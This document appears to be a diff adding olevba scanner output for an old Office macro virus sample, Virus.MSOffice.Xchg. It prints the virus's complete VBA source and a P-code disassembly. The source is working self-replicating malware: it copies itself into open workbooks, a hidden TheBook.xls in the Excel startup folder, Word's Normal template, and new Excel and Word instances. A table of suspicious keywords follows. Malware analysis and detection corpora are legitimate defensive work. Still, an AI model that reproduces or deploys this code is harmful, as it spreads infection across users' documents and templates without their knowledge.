@@ -1,0 +1,727 @@
+olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
+===============================================================================
+FILE: ./Virus.MSOffice.Xchg
+Type: OLE
+-------------------------------------------------------------------------------
+VBA MACRO ThisDocument.cls 
+in file: ./Virus.MSOffice.Xchg - OLE stream: 'Macros/VBA/ThisDocument'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+(empty macro)
+-------------------------------------------------------------------------------
+VBA MACRO xchg.bas 
+in file: ./Virus.MSOffice.Xchg - OLE stream: 'Macros/VBA/xchg'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Rem Name:   Office97Macro.Xchange
+Rem Author: jack twoflower LineZer0/Metaphase
+Rem Date:   May 1999
+
+
+
+Sub InfExcel()
+Set Host = CheckForRefExcel
+VirusLength = Host.VBComponents("xchg").CodeModule.CountOfLines
+VirusCode = Host.VBComponents("xchg").CodeModule.Lines(1, VirusLength)
+
+Set Active_ = ActiveWorkbook.VBProject.VBComponents
+
+For i = 1 To Active_.Count
+    If Active_(i).Name = "xchg" Then AlreadyInf = True
+Next
+
+If AlreadyInf <> True Then
+    Active_.Add (vbext_ct_StdModule)
+    Active_(Active_.Count).Name = "xchg"
+    Active_("xchg").CodeModule.AddFromString VirusCode
+    ActiveWorkbook.SaveAs ActiveWorkbook.FullName
+End If
+
+If UCase(Dir(Application.StartupPath & "\TheBook.xls")) <> "THEBOOK.XLS" Then
+    Workbooks.Add.SaveAs Application.StartupPath & "\TheBook.xls"
+    Workbooks("TheBook.xls").VBProject.VBComponents.Add (vbext_ct_StdModule)
+    Workbooks("TheBook.xls").VBProject.VBComponents(Workbooks("TheBook.xls").VBProject.VBComponents.Count).Name = "xchg"
+    Workbooks("TheBook.xls").VBProject.VBComponents("xchg").CodeModule.AddFromString VirusCode
+    Windows("TheBook.xls").Visible = False
+    Workbooks("TheBook.xls").Save
+End If
+
+End Sub
+
+Sub InfExcelCross()
+
+Set Host = CheckForRefWord
+VirusLength = Host.VBComponents("xchg").CodeModule.CountOfLines
+VirusCode = Host.VBComponents("xchg").CodeModule.Lines(1, VirusLength)
+
+Set xl = CreateObject("excel.application")
+Set work = xl.Workbooks.Add
+
+work.VBProject.VBComponents.Add (vbext_ct_StdModule)
+work.VBProject.VBComponents("Modul1").CodeModule.AddFromString VirusCode
+
+work.SaveAs xl.StartupPath & "\TheBook.xls"
+
+xl.Quit
+
+End Sub
+
+Sub InfWord()
+
+Set Host = CheckForRefWord
+VirusLength = Host.VBComponents("xchg").CodeModule.CountOfLines
+VirusCode = Host.VBComponents("xchg").CodeModule.Lines(1, VirusLength)
+
+Set Normal_ = NormalTemplate.VBProject.VBComponents
+Set Active_ = ActiveDocument.VBProject.VBComponents
+
+For i = 1 To Normal_.Count
+    If Normal_(i).Name = "xchg" Then NorIns = True
+Next i
+For j = 1 To Active_.Count
+    If Active_(j).Name = "xchg" Then ActIns = True
+    MsgBox Active_(j).Name
+Next j
+
+If NorIns <> True Then
+    Normal_.Add (vbext_ct_StdModule)
+    Normal_(Normal_.Count).Name = "xchg"
+    Normal_("xchg").CodeModule.AddFromString VirusCode
+    NormalTemplate.Save
+End If
+
+If ActIns <> True Then
+    Active_.Add (vbext_ct_StdModule)
+    Active_(Active_.Count).Name = "xchg"
+    Active_("xchg").CodeModule.AddFromString VirusCode
+    ActiveDocument.SaveAs ActiveDocument.FullName
+End If
+End Sub
+
+Sub InfWordCross()
+
+Set Host = CheckForRefExcel
+VirusLength = Host.VBComponents("xchg").CodeModule.CountOfLines
+VirusCode = Host.VBComponents("xchg").CodeModule.Lines(1, VirusLength)
+
+Set wd = CreateObject("word.application")
+
+wd.NormalTemplate.VBProject.VBComponents.Add (vbext_ct_StdModule)
+wd.NormalTemplate.VBProject.VBComponents("Modul1").CodeModule.AddFromString VirusCode
+
+wd.NormalTemplate.Save
+
+wd.Quit
+
+End Sub
+
+Function CheckForRefExcel()
+
+Set CheckForRefExcel = ActiveWorkbook.VBProject
+
+For i = 1 To CheckForRefExcel.References.Count
+    If CheckForRefExcel.References(i).Name = "VBIDE" Then AlreadyRef = True
+Next
+
+If AlreadyRef = False Then CheckForRefExcel.References.AddFromGuid "{0002E157-0000-0000-C000-000000000046}", 1, 0
+End Function
+
+Function CheckForRefWord()
+
+If MacroContainer = NormalTemplate Then Set CheckForRefWord = NormalTemplate.VBProject
+If MacroContainer = ActiveDocument Then Set CheckForRefWord = ActiveDocument.VBProject
+
+For i = 1 To CheckForRefWord.References.Count
+    If CheckForRefWord.References(i).Name = "VBIDE" Then AlreadyRef = True
+Next
+
+If AlreadyRef = False Then CheckForRefWord.References.AddFromGuid "{0002E157-0000-0000-C000-000000000046}", 1, 0
+End Function
+
+Rem Dead Kennedys roqs!!!
+-------------------------------------------------------------------------------
+VBA MACRO VBA_P-code.txt 
+in file: VBA P-code - OLE stream: 'VBA P-code'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+' Processing file: ./Virus.MSOffice.Xchg
+' ===============================================================================
+' Module streams:
+' Macros/VBA/ThisDocument - 903 bytes
+' Macros/VBA/xchg - 6252 bytes
+' Line #0:
+' 	Rem 0x001E " Name:   Office97Macro.Xchange"
+' Line #1:
+' 	Rem 0x002A " Author: jack twoflower LineZer0/Metaphase"
+' Line #2:
+' 	Rem 0x0011 " Date:   May 1999"
+' Line #3:
+' Line #4:
+' Line #5:
+' Line #6:
+' 	FuncDefn (Sub InfExcel())
+' Line #7:
+' 	SetStmt 
+' 	Ld CheckForRefExcel 
+' 	Set Host 
+' Line #8:
+' 	LitStr 0x0004 "xchg"
+' 	Ld Host 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	MemLd CountOfLines 
+' 	St VirusLength 
+' Line #9:
+' 	LitDI2 0x0001 
+' 	Ld VirusLength 
+' 	LitStr 0x0004 "xchg"
+' 	Ld Host 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemLd Lines 0x0002 
+' 	St VirusCode 
+' Line #10:
+' Line #11:
+' 	SetStmt 
+' 	Ld ActiveWorkbook 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	Set Active_ 
+' Line #12:
+' Line #13:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	Ld Active_ 
+' 	MemLd Count 
+' 	For 
+' Line #14:
+' 	Ld i 
+' 	ArgsLd Active_ 0x0001 
+' 	MemLd New 
+' 	LitStr 0x0004 "xchg"
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	LitVarSpecial (True)
+' 	St AlreadyInf 
+' 	EndIf 
+' Line #15:
+' 	StartForVariable 
+' 	Next 
+' Line #16:
+' Line #17:
+' 	Ld AlreadyInf 
+' 	LitVarSpecial (True)
+' 	Ne 
+' 	IfBlock 
+' Line #18:
+' 	Ld vbext_ct_StdModule 
+' 	Paren 
+' 	Ld Active_ 
+' 	ArgsMemCall Add 0x0001 
+' Line #19:
+' 	LitStr 0x0004 "xchg"
+' 	Ld Active_ 
+' 	MemLd Count 
+' 	ArgsLd Active_ 0x0001 
+' 	MemSt New 
+' Line #20:
+' 	Ld VirusCode 
+' 	LitStr 0x0004 "xchg"
+' 	ArgsLd Active_ 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemCall AddFromString 0x0001 
+' Line #21:
+' 	Ld ActiveWorkbook 
+' 	MemLd FullName 
+' 	Ld ActiveWorkbook 
+' 	ArgsMemCall SaveAs 0x0001 
+' Line #22:
+' 	EndIfBlock 
+' Line #23:
+' Line #24:
+' 	Ld Application 
+' 	MemLd StartupPath 
+' 	LitStr 0x000C "\TheBook.xls"
+' 	Concat 
+' 	ArgsLd Dir 0x0001 
+' 	ArgsLd UCase 0x0001 
+' 	LitStr 0x000B "THEBOOK.XLS"
+' 	Ne 
+' 	IfBlock 
+' Line #25:
+' 	Ld Application 
+' 	MemLd StartupPath 
+' 	LitStr 0x000C "\TheBook.xls"
+' 	Concat 
+' 	Ld Workbooks 
+' 	MemLd Add 
+' 	ArgsMemCall SaveAs 0x0001 
+' Line #26:
+' 	Ld vbext_ct_StdModule 
+' 	Paren 
+' 	LitStr 0x000B "TheBook.xls"
+' 	ArgsLd Workbooks 0x0001 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	ArgsMemCall Add 0x0001 
+' Line #27:
+' 	LitStr 0x0004 "xchg"
+' 	LitStr 0x000B "TheBook.xls"
+' 	ArgsLd Workbooks 0x0001 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	MemLd Count 
+' 	LitStr 0x000B "TheBook.xls"
+' 	ArgsLd Workbooks 0x0001 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemSt New 
+' Line #28:
+' 	Ld VirusCode 
+' 	LitStr 0x0004 "xchg"
+' 	LitStr 0x000B "TheBook.xls"
+' 	ArgsLd Workbooks 0x0001 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemCall AddFromString 0x0001 
+' Line #29:
+' 	LitVarSpecial (False)
+' 	LitStr 0x000B "TheBook.xls"
+' 	ArgsLd Windows 0x0001 
+' 	MemSt Visible 
+' Line #30:
+' 	LitStr 0x000B "TheBook.xls"
+' 	ArgsLd Workbooks 0x0001 
+' 	ArgsMemCall Save 0x0000 
+' Line #31:
+' 	EndIfBlock 
+' Line #32:
+' Line #33:
+' 	EndSub 
+' Line #34:
+' Line #35:
+' 	FuncDefn (Sub InfExcelCross())
+' Line #36:
+' Line #37:
+' 	SetStmt 
+' 	Ld CheckForRefWord 
+' 	Set Host 
+' Line #38:
+' 	LitStr 0x0004 "xchg"
+' 	Ld Host 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	MemLd CountOfLines 
+' 	St VirusLength 
+' Line #39:
+' 	LitDI2 0x0001 
+' 	Ld VirusLength 
+' 	LitStr 0x0004 "xchg"
+' 	Ld Host 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemLd Lines 0x0002 
+' 	St VirusCode 
+' Line #40:
+' Line #41:
+' 	SetStmt 
+' 	LitStr 0x0011 "excel.application"
+' 	ArgsLd CreateObject 0x0001 
+' 	Set xl 
+' Line #42:
+' 	SetStmt 
+' 	Ld xl 
+' 	MemLd Workbooks 
+' 	MemLd Add 
+' 	Set work 
+' Line #43:
+' Line #44:
+' 	Ld vbext_ct_StdModule 
+' 	Paren 
+' 	Ld work 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	ArgsMemCall Add 0x0001 
+' Line #45:
+' 	Ld VirusCode 
+' 	LitStr 0x0006 "Modul1"
+' 	Ld work 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemCall AddFromString 0x0001 
+' Line #46:
+' Line #47:
+' 	Ld xl 
+' 	MemLd StartupPath 
+' 	LitStr 0x000C "\TheBook.xls"
+' 	Concat 
+' 	Ld work 
+' 	ArgsMemCall SaveAs 0x0001 
+' Line #48:
+' Line #49:
+' 	Ld xl 
+' 	ArgsMemCall Quit 0x0000 
+' Line #50:
+' Line #51:
+' 	EndSub 
+' Line #52:
+' Line #53:
+' 	FuncDefn (Sub InfWord())
+' Line #54:
+' Line #55:
+' 	SetStmt 
+' 	Ld CheckForRefWord 
+' 	Set Host 
+' Line #56:
+' 	LitStr 0x0004 "xchg"
+' 	Ld Host 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	MemLd CountOfLines 
+' 	St VirusLength 
+' Line #57:
+' 	LitDI2 0x0001 
+' 	Ld VirusLength 
+' 	LitStr 0x0004 "xchg"
+' 	Ld Host 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemLd Lines 0x0002 
+' 	St VirusCode 
+' Line #58:
+' Line #59:
+' 	SetStmt 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	Set Normal_ 
+' Line #60:
+' 	SetStmt 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	Set Active_ 
+' Line #61:
+' Line #62:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	Ld Normal_ 
+' 	MemLd Count 
+' 	For 
+' Line #63:
+' 	Ld i 
+' 	ArgsLd Normal_ 0x0001 
+' 	MemLd New 
+' 	LitStr 0x0004 "xchg"
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	LitVarSpecial (True)
+' 	St NorIns 
+' 	EndIf 
+' Line #64:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #65:
+' 	StartForVariable 
+' 	Ld j 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	Ld Active_ 
+' 	MemLd Count 
+' 	For 
+' Line #66:
+' 	Ld j 
+' 	ArgsLd Active_ 0x0001 
+' 	MemLd New 
+' 	LitStr 0x0004 "xchg"
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	LitVarSpecial (True)
+' 	St ActIns 
+' 	EndIf 
+' Line #67:
+' 	Ld j 
+' 	ArgsLd Active_ 0x0001 
+' 	MemLd New 
+' 	ArgsCall MsgBox 0x0001 
+' Line #68:
+' 	StartForVariable 
+' 	Ld j 
+' 	EndForVariable 
+' 	NextVar 
+' Line #69:
+' Line #70:
+' 	Ld NorIns 
+' 	LitVarSpecial (True)
+' 	Ne 
+' 	IfBlock 
+' Line #71:
+' 	Ld vbext_ct_StdModule 
+' 	Paren 
+' 	Ld Normal_ 
+' 	ArgsMemCall Add 0x0001 
+' Line #72:
+' 	LitStr 0x0004 "xchg"
+' 	Ld Normal_ 
+' 	MemLd Count 
+' 	ArgsLd Normal_ 0x0001 
+' 	MemSt New 
+' Line #73:
+' 	Ld VirusCode 
+' 	LitStr 0x0004 "xchg"
+' 	ArgsLd Normal_ 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemCall AddFromString 0x0001 
+' Line #74:
+' 	Ld NormalTemplate 
+' 	ArgsMemCall Save 0x0000 
+' Line #75:
+' 	EndIfBlock 
+' Line #76:
+' Line #77:
+' 	Ld ActIns 
+' 	LitVarSpecial (True)
+' 	Ne 
+' 	IfBlock 
+' Line #78:
+' 	Ld vbext_ct_StdModule 
+' 	Paren 
+' 	Ld Active_ 
+' 	ArgsMemCall Add 0x0001 
+' Line #79:
+' 	LitStr 0x0004 "xchg"
+' 	Ld Active_ 
+' 	MemLd Count 
+' 	ArgsLd Active_ 0x0001 
+' 	MemSt New 
+' Line #80:
+' 	Ld VirusCode 
+' 	LitStr 0x0004 "xchg"
+' 	ArgsLd Active_ 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemCall AddFromString 0x0001 
+' Line #81:
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	Ld ActiveDocument 
+' 	ArgsMemCall SaveAs 0x0001 
+' Line #82:
+' 	EndIfBlock 
+' Line #83:
+' 	EndSub 
+' Line #84:
+' Line #85:
+' 	FuncDefn (Sub InfWordCross())
+' Line #86:
+' Line #87:
+' 	SetStmt 
+' 	Ld CheckForRefExcel 
+' 	Set Host 
+' Line #88:
+' 	LitStr 0x0004 "xchg"
+' 	Ld Host 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	MemLd CountOfLines 
+' 	St VirusLength 
+' Line #89:
+' 	LitDI2 0x0001 
+' 	Ld VirusLength 
+' 	LitStr 0x0004 "xchg"
+' 	Ld Host 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemLd Lines 0x0002 
+' 	St VirusCode 
+' Line #90:
+' Line #91:
+' 	SetStmt 
+' 	LitStr 0x0010 "word.application"
+' 	ArgsLd CreateObject 0x0001 
+' 	Set wd 
+' Line #92:
+' Line #93:
+' 	Ld vbext_ct_StdModule 
+' 	Paren 
+' 	Ld wd 
+' 	MemLd NormalTemplate 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	ArgsMemCall Add 0x0001 
+' Line #94:
+' 	Ld VirusCode 
+' 	LitStr 0x0006 "Modul1"
+' 	Ld wd 
+' 	MemLd NormalTemplate 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemCall AddFromString 0x0001 
+' Line #95:
+' Line #96:
+' 	Ld wd 
+' 	MemLd NormalTemplate 
+' 	ArgsMemCall Save 0x0000 
+' Line #97:
+' Line #98:
+' 	Ld wd 
+' 	ArgsMemCall Quit 0x0000 
+' Line #99:
+' Line #100:
+' 	EndSub 
+' Line #101:
+' Line #102:
+' 	FuncDefn (Function CheckForRefExcel())
+' Line #103:
+' Line #104:
+' 	SetStmt 
+' 	Ld ActiveWorkbook 
+' 	MemLd VBProject 
+' 	Set CheckForRefExcel 
+' Line #105:
+' Line #106:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	Ld CheckForRefExcel 
+' 	MemLd References 
+' 	MemLd Count 
+' 	For 
+' Line #107:
+' 	Ld i 
+' 	Ld CheckForRefExcel 
+' 	ArgsMemLd References 0x0001 
+' 	MemLd New 
+' 	LitStr 0x0005 "VBIDE"
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	LitVarSpecial (True)
+' 	St AlreadyRef 
+' 	EndIf 
+' Line #108:
+' 	StartForVariable 
+' 	Next 
+' Line #109:
+' Line #110:
+' 	Ld AlreadyRef 
+' 	LitVarSpecial (False)
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	LitStr 0x0026 "{0002E157-0000-0000-C000-000000000046}"
+' 	LitDI2 0x0001 
+' 	LitDI2 0x0000 
+' 	Ld CheckForRefExcel 
+' 	MemLd References 
+' 	ArgsMemCall AddFromGuid 0x0003 
+' 	EndIf 
+' Line #111:
+' 	EndFunc 
+' Line #112:
+' Line #113:
+' 	FuncDefn (Function CheckForRefWord())
+' Line #114:
+' Line #115:
+' 	Ld MacroContainer 
+' 	Ld NormalTemplate 
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	SetStmt 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	Set CheckForRefWord 
+' 	EndIf 
+' Line #116:
+' 	Ld MacroContainer 
+' 	Ld ActiveDocument 
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	SetStmt 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	Set CheckForRefWord 
+' 	EndIf 
+' Line #117:
+' Line #118:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	Ld CheckForRefWord 
+' 	MemLd References 
+' 	MemLd Count 
+' 	For 
+' Line #119:
+' 	Ld i 
+' 	Ld CheckForRefWord 
+' 	ArgsMemLd References 0x0001 
+' 	MemLd New 
+' 	LitStr 0x0005 "VBIDE"
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	LitVarSpecial (True)
+' 	St AlreadyRef 
+' 	EndIf 
+' Line #120:
+' 	StartForVariable 
+' 	Next 
+' Line #121:
+' Line #122:
+' 	Ld AlreadyRef 
+' 	LitVarSpecial (False)
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	LitStr 0x0026 "{0002E157-0000-0000-C000-000000000046}"
+' 	LitDI2 0x0001 
+' 	LitDI2 0x0000 
+' 	Ld CheckForRefWord 
+' 	MemLd References 
+' 	ArgsMemCall AddFromGuid 0x0003 
+' 	EndIf 
+' Line #123:
+' 	EndFunc 
+' Line #124:
+' Line #125:
+' 	Rem 0x0016 " Dead Kennedys roqs!!!"
++----------+--------------------+---------------------------------------------+
+|Type      |Keyword             |Description                                  |
++----------+--------------------+---------------------------------------------+
+|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
+|          |s                   |                                             |
+|Suspicious|CreateObject        |May create an OLE object                     |
+|Suspicious|Windows             |May enumerate application windows (if        |
+|          |                    |combined with Shell.Application object)      |
+|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
+|          |                    |modification)                                |
+|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
+|          |                    |modification)                                |
+|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
+|          |                    |modification)                                |
+|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
+|          |                    |modification)                                |
+|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
+|          |                    |used to obfuscate strings (option --decode to|
+|          |                    |see all)                                     |
+|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
+|          |                    |used to obfuscate strings (option --decode to|
+|          |                    |see all)                                     |
+|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
+|          |                    |code and P-code are different, this may have |
+|          |                    |been used to hide malicious code             |
++----------+--------------------+---------------------------------------------+
+VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues
+
